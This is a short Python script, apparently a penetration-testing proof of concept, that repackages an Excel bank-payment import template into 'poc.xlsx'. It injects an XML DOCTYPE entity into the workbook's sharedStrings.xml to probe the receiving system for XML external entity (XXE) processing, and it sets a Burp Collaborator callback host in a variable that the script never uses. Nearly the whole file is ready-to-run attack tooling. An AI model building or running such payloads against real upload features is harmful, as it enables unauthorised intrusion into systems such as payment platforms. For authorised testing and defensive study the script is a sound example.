import zipfile
import textwrap

# 配置
input_file = r"C:\Users\kiin\Downloads\导入数据.xlsx"  # 原xlsx
output_file = r"C:\Users\kiin\Downloads\poc.xlsx"
collaborator_url = 'ztybtfinet.zaza.eu.org'  # Burp URL

# XInclude模板（基于原workbook.xml）
xml_template = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="39" uniqueCount="23"><si><t>分组</t></si><si><t>结算方式*</t></si><si><t>银行业务*</t></si><si><t>付款方账户名称*</t></si><si><t>付款方银行账号*</t></si><si><t>付款方开户银行</t></si><si><t>付款方银行行号</t></si><si><t>付款方开户地区</t></si><si><t>收款方账户名称*</t></si><si><t>收款方银行账号*</t></si><si><t>收款方省份</t></si><si><t>收款方地区</t></si><si><t>收款方银行机构</t></si><si><t>收款方银行行号</t></si><si><t>收款方开户银行*</t></si><si><t>收款方开户地区</t></si><si><t>金额*</t></si><si><t>摘要</t></si><si><t>财政授权支付码</t></si><si><t>备注</t></si><si><t>1</t></si><si><t>1去</t></si><si><t>1test</t></si></sst>
'''


xml_template = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe "XXE_INJECT_SUCCESS"> ]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="39" uniqueCount="23"><si><t>分组</t></si><si><t>结算方式*</t></si><si><t>银行业务*</t></si><si><t>付款方账户名称*</t></si><si><t>付款方银行账号*</t></si><si><t>付款方开户银行</t></si><si><t>付款方银行行号</t></si><si><t>付款方开户地区</t></si><si><t>收款方账户名称*</t></si><si><t>收款方银行账号*</t></si><si><t>收款方省份</t></si><si><t>收款方地区</t></si><si><t>收款方银行机构</t></si><si><t>收款方银行行号</t></si><si><t>收款方开户银行*</t></si><si><t>收款方开户地区</t></si><si><t>金额*</t></si><si><t>摘要</t></si><si><t>财政授权支付码</t></si><si><t>备注</t></si><si><t>1</t></si><si><t>1去</t></si><si><t>&xxe;</t></si></sst>
'''

# 格式化
modified_xml = xml_template.strip()

# 验证
print(f"XML长度: {len(modified_xml)}")
print("开头:", modified_xml[:300])

# ZIP替换
try:
    with zipfile.ZipFile(input_file, 'r') as zin:
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zout:
            for item in zin.infolist():
                if item.filename == 'xl/sharedStrings.xml':
                    print("✓ 注入到sharedStrings.xml")
                    zout.writestr(item, modified_xml.encode('utf-8'))
                else:
                    zout.writestr(item, zin.read(item.filename))
    print(f"✓ POC: {output_file}")
except Exception as e:
    print(f"❌ {e}")